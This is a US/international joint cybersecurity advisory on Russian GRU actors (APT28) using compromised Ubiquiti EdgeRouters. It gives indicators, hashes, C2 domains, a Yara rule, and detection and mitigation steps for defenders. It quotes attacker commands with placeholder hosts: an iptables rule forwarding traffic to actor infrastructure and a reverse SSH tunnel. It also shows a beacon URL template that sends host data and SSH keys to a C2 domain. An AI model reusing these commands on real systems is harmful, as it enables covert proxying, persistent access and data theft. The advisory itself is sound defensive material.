{
  "markdown": "  \n \n \n \n  \n  \n \n \n \n \n \n \n  \nTo report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory , contact \nyour local FBI field office at www.fbi.gov/contact -us/field , or submit a report to the FBI Internet Crime Complaint \nCenter (IC3) . When available, please include the following information regarding the incident: date, time, and \nlocation of the incident; type of activity; number of people affected; type of equipment used for the activity; the \nname of the submitting company or organization; and a designated point of contact.  \nThis document is marked TLP: CLEAR . Disclosure is not limited. Sources may  use TLP: CLEAR  when information \ncarries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public \nrelease. Subject to standard copyright rules, TLP: CLEAR  information may be distributed without restriction.  \nFor more information on the Traffic Light Protocol, see http://www. cisa.gov/tlp/ . \n \nTLP: CLEAR    February 2 7, 2024  TLP: CLEAR  \n Co-Authored by:  Product ID: JCSA -20240227 -001 \nRussian Cyber  Actors  Use Compromise d Routers to \nFacilitate Cyber Operations  \nSUMMARY  \nThe Federal Bureau of Investigation (FBI) , \nNational Security Agency (NS A), US Cyber \nCommand,  and international partners  are releasing \nthis joint Cybersecurity Advisory (CSA) to warn of \nRussian state -sponsored cyber actors  use of \ncompromis ed Ubiquiti  EdgeRouters (EdgeRouters)  \nto facilitate malicious cyber operations  worldwide . \nThe FBI, NSA, US Cyber Command , and \ninternational partners   including authorities from \nBelgium, Brazil, France, Germany , Latvia, \nLithuania, Norway, Poland , South Korea, and the \nUnited Kingdom -- assess the Russian General Staff Main Intelligence Directo rate (GRU) , 85th Main \nSpecial Service Center (GTsSS) , also known as APT28, Fancy Bear, and Forest Blizzard (Strontium) , \nhave used compromised EdgeRouters  globally  to harvest credentials, collect NTLMv2 digests, proxy \nnetwork  traffic, and host spear -phishing  landing pages  and custom tools . \nThe U.S. Department of Justice, including the FBI, and international partners recently disrupted  a \nGRU botnet consisting of such routers. However, owners of relevant devices should take the  remedial \nactions described below to ensure the long -term success of the disruption effort and to identify and \nremediate any similar compromises.  Actions EdgeRouter network defenders and \nusers should implement to protect against \nAPT28 activity : \n Perform a hardware factory reset.  \n Upgrade to the latest firmware version.  \n Change any default usernames and \npasswords.  \n Implement strategic firewall rules on \nWAN -side interfaces . \n\n \n  TLP: CLEAR  \n \nPage 2 of 8  |  Product ID: JCSA -20240227 -001 \n TLP: CLEAR    TECHNIC AL DETAILS  \nNote:  This advisory uses the MITRE ATT&CK for Enterprise  framework, version 14. See the MITRE \nATT&CK Tactics and Techniques section for a table of the threat actors act ivity mapped to MITRE \nATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE \nATT&CK framework, see CISA and MITRE ATT&CKs Best Practices for MITRE ATT&CK Mapping  \nand CISAs Decider Tool . \nOverview  \nThis advisory provides observed tactics, techniques, and procedures (TTPs), indicators of \ncompromise (IOCs), and recommendations to  mitigate t he threat  posed by APT28 threat actors \nrelated to compromised EdgeRouters . Given the global popularity of EdgeRouters, the FBI and its \ninternational partners  urge EdgeRouter network defenders and users to apply immediately the \nrecommendations in the Mitigations section of this CSA to reduce the likelihood and impact of \ncybersecurity incidents associated with APT28 activity.  \nUbiquiti EdgeRouters have a user -friendly, Linux -based operating system that makes them popular  \nfor both consumers and malicious cyber actors. EdgeRouters are often shipped with default \ncredentials and limited  to no firewall protections to accommodate wireless internet service providers  \n(WISPs) . Additionally, EdgeRouters do not automatically update firmwa re unless a consumer \nconfigures them to do so . \nThreat Actor Activity   \nAs early as  2022 , APT28  actors had utilized compromised EdgeRouters  to facilitate covert cyber  \noperations  against governments , militaries, and organizations  around  the worl d. These operati ons \nhave targeted various industries,  including  Aerospace & Defense, Education, Energy & Utilities, \nGovernments, Hospitality, Manufacturing, Oil & Gas, Retail, Technology, and Transportation. \nTargeted countries  include Czech Republic, Italy, Lithuan ia, Jordan, Montenegro, Poland , Slovakia, \nTurkey, Ukraine, United Arab Emirates, and the US [1][2] . Additionally, the actors have strategically \ntargeted many individuals  in Ukraine.  \nAn FBI investigation revealed  APT28  actors accessed EdgeRouters compromised  by Moobot , a \nbotnet that installs OpenSSH trojans on compromised hardware [T1588 ]. While the compromise of \nEdgeRouters has been  documented in open -source reporting , FBI investigation revealed e ach \ncompromised router accessed by  APT28  actors housed a  collection of Bash scripts and ELF binaries \ndesigned to exploit  backd oor OpenSSH daemons and related services [ T1546 ] for a variet y of \npurposes . \nAPT28 actors have used compromised EdgeRouters to collect credentials, proxy network traffic, and \nhost spoofed landing pages and custom post -exploitation tools.  For example, i n early 2023, APT28  \nactors authored custom Python script s to collect account credentials for specifically targeted  webmail \nusers . APT28 actors uploaded these  custom Python script s [T1587 ] to a subset of compromised \nUbiquiti routers to validate stolen webmail account credentials collected via cross -site scripting and \nbrowser -in-the-browser spear -phishing campaigns  [T1566 ].  \n\n \n  TLP: CLEAR  \n \nPage 3 of 8  |  Product ID: JCSA -20240227 -001 \n TLP: CLEAR    Additionally, an FBI investigation revealed that  as early as 2022 , APT28  actors had exploited CVE -\n2023 -23397, a zero -day vulnerability at the time , to collect NTLMv2 digests from targeted Outlook \naccounts  [T1203 ]. Per a Microsoft blog post [3] published in March 2023, CVE -2023 -23397 is a critical \nelevation of privilege vulnerability in Microsoft Outlook on Windows wherein Net -NTLMv2 hashes are \nleaked to actor -controlled infrastructure  [T1119 , T1020 ]. Despite Microsoft releasing a patch for the \nvulnerability, FBI investigation revealed APT28 actors have continued to exploit CV E-2023 -23397 to \nleak NTLM digests to actor controlled infrastructure. APT28  actors  have installed publicly availab le \ntools  such as  Impacket ntlmrelayx.py [4] and Responder [5] on compromised Ubiquiti routers to \nexecute NTLM relay attacks  [T1557 ] and host NTLMv2 rogue authentication servers  [T1556 ].  \nIn summary, w ith root access to compromised Ubiquiti  EdgeRouter s, APT28  actors  have unfettered  \naccess  to Linux -based operating systems  to install tooling and to obfuscate their identity while \nconducting malicious campaigns . \nIndicators of Compromise  \nThe FBI  identified  IOCs  for the Moobot OpenSSH trojan and for APT28  activity  on EdgeRouters . \nReaders of this CSA can reference the observations  below to determine if their EdgeRouters have \nbeen impacted  by either party.  \nMoobot OpenSSH Trojan  \nAPT28  actors have leveraged  default credentials and trojanized OpenSSH s erver processes to \naccess EdgeRouters . Trojanized  OpenSSH server processes are associated with Moobot , a Mirai -\nbased botnet that infects internet of things (IoT) devices using remotely exploitable vulnerabilit ies, \nsuch as  weak or default passwords . Trojanized  OpenSSH server binar ies downloaded from \npackinstall[.]kozow[.]com replace d legitimate binaries on EdgeRouters  accessed by APT28 , allowing \nremote attackers to bypass authentication.  \nCredential Access via Python Script s  \nAPT28  actors have hosted c ustom Python scripts on compromised EdgeRouters  to collect and \nvalidate stolen webmail account credentials. The scripts are typically stored  alongside related log files  \nin the home directory of a compromised user, e.g., /home/<compromised user>/srv/core.py  and \n/home/<compromised user>/srv/debug.txt . The FBI has recovered verbose log files with information \nabout APT28  activity  on EdgeRouters . \nFile name  SHA-256 \ncore.py 4E32B04930D1F745EBA92255EE1C5E5AC82B939FF12DE0522C8A4905431D033D  \ncore.py C51C6AA0230A2FEA888EBCD213D302F1CC9F6051FDB268AE5C7A09415845C404  \nNetwork defen ders can use the FBI-created Yara rule below to  locate credential collection scripts on \ncompromised EdgeRouters . Additionally, they can query network traffic for connections with API \nendpoint  api[.]anti -captcha[.]com , which APT28  actors use in their custom Python scripts to \nautomatically break captcha problem s on webmail login pages.  \nrule APT28_core_scripts  { \nstrings:  \n   $a = \"make_response('BAD')\"  \n   $b = \"make_response('Finaly')\"  \n\n \n  TLP: CLEAR  \n \nPage 4 of 8  |  Product ID: JCSA -20240227 -001 \n TLP: CLEAR       $c = \"make_response('NOOP')\"  \n   $d = \"api.anti -captcha.com\"  \n$e = \"messages/remove\"  \n$f = \"acbb64c3de5ea5e5936df4a1eecf1235\"  \ncondition:  \n5 of them \n} \nExploitation of CVE-2023 -23397  \nAPT28  actors have used ntlmrelayx.py  and Respon der to facilitate NTMLv2 credential leaks via \nexploitation of CVE -2023 -23397 as a zero -day vulnerability since early 2022. The FBI collected \nevidence of APT28  CVE-2023 -23397  activity on numerous compromised EdgeRouters.  With default \nconfigurations, Responder logs activity to the following files: \n- Responder -Session.log, and  \n- Responder.db.  \nNetwork defenders and users can search EdgeRouters  for tooling associated with ntlmrelayx.py  \nand Responder to identify APT28  activity.  \nProxy and Tunnel  Infrastructure  \nAPT28  actors have used iptables rules on EdgeRouters to  establish  reverse proxy connections to \ndedicated infrastructure. Readers of this CSA can review iptables chains and  Bash histories on \nEdgeRouters for unusual invocations like the example provided below.   \niptables -t nat -I PREROUTING -d <router IP address> -p tcp -m tcp --dport 4443 -\nj DNAT -to-destination <APT28 dedicated infrastructure>:10081  \nAdditionally, APT28 actors have uploaded adversary -controlled SSH R SA keys to compromised \nEdgeRouters to establish reverse SSH tunnels and access compromised devices. Readers of this \nCSA can review /root/.ssh/ and other .ssh/ directories under /home/ for unknown RSA keys, which \nadversaries have used to access EdgeRouters despite password changes.  Readers can also query \nnetwork traffic logs on EdgeRouters to identify abnormal SSH sessions. An invocation of a reverse \nSSH tunnel used by APT28  actors  is included below.  \nssh i <RSA key> -p <port> root@<router IP address>  -R <router IP address>:<port>  \nMASEPIE Malware  \nIn December 2023, APT28 actors wrote MASEPIE [6], a small Python backdoor capable of executing \narbitrary commands on victim machines. An FBI investigation revealed that on more than one \noccasion, APT28 used compromise d Ubiquiti EdgeRouters as command -and-control infrastructure for \nMASEPIE backdoors deployed against targets. Data sent to and from the EdgeRouters was \nencrypted using a randomly generated 16 -character AES key. It is important to note that APT28 does \nnot de ploy MASEPIE on EdgeRouters, but rather on systems belonging to targeted individuals and \norganizations.  \n\n \n  TLP: CLEAR  \n \nPage 5 of 8  |  Product ID: JCSA -20240227 -001 \n TLP: CLEAR    SHA-256 for MASEPIE backdoors  \n40a7fd89b9e51b0a515ac2355036d203357be90a2200b9c506b95c12db54c7aa  \n18f891a3737bb53cd1ab451e2140654a376a43b2d75f6695f3133d47a 41952b6  \n0429bdc6a302b4288aea1b1e2f2a7545731c50d647672fa65b012b2a2caa386e  \nDETECTION  \nTo locate related, malicious files on EdgeRouters, search Bash histories of all users for file downloads \nfrom domain packinstall [.]kozow[.]com , query network traffic for connections with domain \npackinstall [.]kozow[.]com , and reference the file hash table below to locate artifacts on disk. \nAdditionally, if directory /usr/lib/libu.a/  exists on an EdgeRouter, it is likely an infection occurred.  \nFile path SHA-256 \n/usr/sbin/cl  3B5ED45345193B06F40515DA342FF146267E8340B2E1AB6D55A257D2E3554A2B  \n/usr/sbin/cl  ADAE1BD8938B9A0D825A2EF7E7C4E000F01966C397306027119F20D7ECCE955D  \n/usr/sbin/cts  C09F8D0A9FA0F9BB3E19556182A95782DAEC2F2F532CAB5EEB5528F2CD783583  \n/usr/sbin/env  1CC20155517860557C94308EC913E4C3BFC072C34CE33449641CC9FB1D571B21  \n/usr/sbin/events  551EB82D82B7A8830549C9183EB39ACF19719C84B9BCCC7FB443504B093F6BB9  \n/usr/sbin/events  CD83DD9470603B1A1951EEFA95B602E34207C4D5E62C649642E7160574A9C50D  \n/usr/sbin/events  FBC2E6820C874ED102BAB304382EDEFFB9708E7B8445E126C227A6C289D92708  \n/usr/sbin/ptty  C9E06C7C62395DA32C91CC0C4ACB95F29A0AA3380A833E7C7B24B8D4DB50C0C6  \n/usr/sbin/ptty  5FACBE53B4C63DBC865F3713385358DF490A4BAD9211337241D85F0554CCA40A  \n/usr/sbin/p tty C7C40CDCDD65E468EE29D330A34E8EE94C26AA8B3F1830E0A8DFEA8ACA3CDD50  \n/usr/sbin/sshd  A4A95807F1C5B200D5D94E3E811A7C4AF2D0D9CA88CA4D7F9D02015574F4716F  \n/usr/sbin/sshd  104E3EA9A190BA039488F5200824FE883B98F6FE01D05A1B55E15ED2199C807A  \n \nSome versions of the  OpenSSH trojan  create malicious users systemd  and systemx  in /etc/shadow  \nand /etc/passwd  on infected EdgeRouters. The trojan also introduces an OpenDNS server IP \naddress in /etc/resolv.conf , 208[.]67[.]220[.]222 , and a user -land process named .kworker  \nto masquerade as a legitimate kernel thread.  \nNetwork defenders can also query network traffic for connections with the following domains, which  \nwere identified by the FBI and  are associated with the OpenSSH trojan . HTTP beacons to these \ndomains follow th e form provided after the list.  \n- matbaiteahe [.]mooo[.]com  \n- lalapoc [.]kozow[.]com  \n- gneivaientga [.]ignorelist[.]com  \n- antotehlant [.]theworkpc[.]com  \n- onechoice [.]gleeze[.]com  \n- mumucnc [.]kozow[.]com  \n<C2_DOMAIN >/srv.php?type=${type}&ip=${ip}&sshd_port=${sshd_port}&ssh d_backup_miss\ning=${sshd_backup_missing}&sshkey=${SSHKEY}&ptty_ver=${ptty_ver}&ctry=${CTRY}&id_\nunic=${id_unic}&os=${os}&arch=${arch}&kernel=${kernel}&upt=${upt}&serverspeed=${s\nerverspeed}&lan=${lan}&lan_ip=${lan_ip}&rk_date=${rk_date}&socks_value=${socks_va\nlue} \n\n \n  TLP: CLEAR  \n \nPage 6 of 8  |  Product ID: JCSA -20240227 -001 \n TLP: CLEAR    EdgeRouters  compromised by the OpenSSH trojan display a unique SSH identification string, SSH-\n2.0-OpenSSH_6.7p2 . Use Netcat or similar tools to collect identification strings from EdgeRouters  \nand other hardware to locate infections.  \n(local) $ nc <IP address of EdgeRouter> <SSH listening port on EdgeRouter>  \nSSH-2.0-OpenSSH_6.7p2 # this version indicates infection.  \nAdditionally, query repositories of banners collected from internet hosts , e.g., Shodan or Censys,  to \nlocate EdgeRouters  infected by the OpenSSH trojan. An example Censys query is provided below. \nThe EdgeOS portion of the query can be negated to return other types of devices infected by the \ntrojan.  \nservices.software.uniform_resource_identifier: `cpe:2.3:a:openbsd:openssh:6. 7p2*` \nand  \nservices.software.uniform_resource_identifier: `cpe:2.3:o:ui:edgeos*`  \nMITRE ATT&CK TA CTICS AND TECHNIQUES  \nSee Tables 1 -7 for all referenced threat  actor tactics and techniques in this advisory.  \nTable 1: APT28 ATT&CK Techniques for Resource Development  \nTechnique Title   ID  Use  \nDevelop Capabilities   T1587   APT28 threat actors authored custom Python scripts to \ncollect account credentials for specifically targeted \nwebmail  users . \nObtain Capabilities  T1588  APT28 actors accessed EdgeRouters compromised by \nMoobot, a botnet that installs OpenSSH trojans on \ncompromised hardware . \nTable 2: APT28 ATT&CK Techniques for Initial Access  \nTechnique Title   ID  Use  \nCompromise \nInfrastructure   T1584   APT28 threat actors have accessed EdgeRouters  \npreviously compromised by an OpenSSH troja n. \nPhishing   T1566   APT28  threat actors conducted cross -site scripting and \nbrowser -in-the-browser spear -phishing campaigns . \nTable 3: APT28 ATT&CK Techniques for Execution  \nTechnique Title  ID  Use  \nExploitation for \nClient Execution   T1203   APT28 threat actors exploited CVE -2023 -23397 .  \nTable 4: APT28 ATT&CK Techniques for Persistence  \nTechnique Title   ID  Use  \n\n \n  TLP: CLEAR  \n \nPage 7 of 8  |  Product ID: JCSA -20240227 -001 \n TLP: CLEAR    Event Triggered \nExecution   T1546  The compromised router housed a collection of Bash \nscripts and ELF binaries designed to backdoor OpenSSH \ndaemons and related services .  \nTable 5: APT28 ATT&CK Techniques for Credential Access  \nTechnique Title   ID  Use  \nAdversary -in-the-\nMiddle   T1557   APT28 threat actors installed publicly available tools \nImpacket ntlmrelayx.pyvi and Respondervii on compromised \nUbiquiti routers to execute NTLM relay attacks .  \nModify \nAuthentication \nProcess  T1556   ATP28  threat actors hosted NTLMv2 rogue authentication \nservers to modify authentication process from stolen \ncredential collected during the NTLM relay attacks .   \nTable 6: APT28 ATT&CK Techniques for Collection  \nTechnique Title   ID  Use  \nAutomated \nCollection  T1119  APT28 utilizes CVE -2023 -23397 to automate NTLMv2 \nhash collectio n. \nTable 7: APT28 ATT&CK Techniques for Exfiltration  \nTechnique Title   ID  Use  \nAutomated \nExfiltration   T1020   APT28 utilizes CVE -2023 -23397 to automate exfiltration to \nactor -controlled infrastructure .  \n \nMITIGATION S \nRebooting a compromised EdgeRouter will not remove the existing malware of concern , if present . \nThe FBI and its partners  recommend the following steps be taken  to remediate  compromised \nEdgeRouters:  \n1. Perform a hardware factory reset  to flush file systems of malicious files , \n2. Upgrade to the latest firmware version , \n3. Change any default usernames and password s, and \n4. Implement strategic firewall rules  on WAN -side interfaces  to prevent the unwanted exposure \nof remote management services . \nAdditionally, all network  owners should keep their operating systems, software, and firmware up to \ndate. Timely patching is one of the most efficient and cost -effective steps an organization can take to \nminimize its exposure to cybersecurity threats.  For CVE -2023 -23397, updating Microsoft Outlook \nmitigates the vulnerability. To mitigate other forms of NTL M relay, all network owners should consider \ndisabling NTLM when feasible, or enabling server signing and Extended Protection for Authentication \nconfigurations [7]. \n\n \n  TLP: CLEAR  \n \nPage 8 of 8  |  Product ID: JCSA -20240227 -001 \n TLP: CLEAR    Further, for longer term mitigations, network owners should prioritize only using routers and other \nequipment incorporating  secure -by-design principles that eliminate default passwords and SOHO \nrouter defects.  \nREPORTING  \nThe FBI seeks any information or evi dence of APT28  activity on compromised  EdgeR outers. This \ninformation provides the FBI with the critical information it need s to deter continued use of such \ntechniques and to hold threat actors accountable under United States law.  \nThe FBI encourages organizations and individuals to report information concerning suspicious or \ncriminal activity to their local FBI field office , or the FBIs Internet Crime Complaint Center (IC3) . \nWhen available, each report submitted should include the date, time, location, type of activity, number \nof people, and type of equipment used for the activity, the name of the submitting company or \norganization, an d a designated point of contact.  \nREFERENCES   \n[1] Mandiant: Campaign 23.056: Suspected Espionage Group with Russia Nexus Conducts Phishing \nCampaign for Credential Harvesting  \n[2] Mandiant: Campaign 23.021: Suspected Espionage Group with Russia Nexus Targeted Multiple \nOrganizations and Governments with CV E-2023 -23397  \n[3] Microsoft: Guidance For Investigating Attacks Using CVE 2023 -23397  \n[4] Github: Fortra/impacket  \n[5] Github: lgandx/Responder  \n[6] CERT -Ukraine: APT28: From Initial Damage to Dom ain Controller Threats in an Hour (CERT -\nUA#8399)  \n[7] Microsoft: Overview of Server Message Block Signing  \nDISCLAIMER  \nThe informati on in this report is being provided as is for informational purposes only. The authoring \nagencies do not endorse any commercial entity, product, company, or service, including any entities, \nproducts, or services linked within this document. Any reference  to specific commercial entities, \nproducts, processes, or services by service mark, trademark, manufacturer, or otherwise, does not \nconstitute or imply endorsement, recommendation, or favoring by the authoring agencies.  \nACKNOWLEDGEMENTS  \nMandiant and Micros oft Threat Intelligence contributed to this advisory.  \nVERSION HISTORY  \nFebruary 27, 2024: Initial version  \n \n\n",
  "cves": [],
  "techniques": [],
  "advisory": "cybersecurity-alerts",
  "title": "csa-russian-actors-use-routers-facilitate-cyber_operations",
  "source": "nsa",
  "id": "5667124792fd5a6e937f5d87b8843f02a7ddd5a896809cc8a27a11d6eee338a5"
}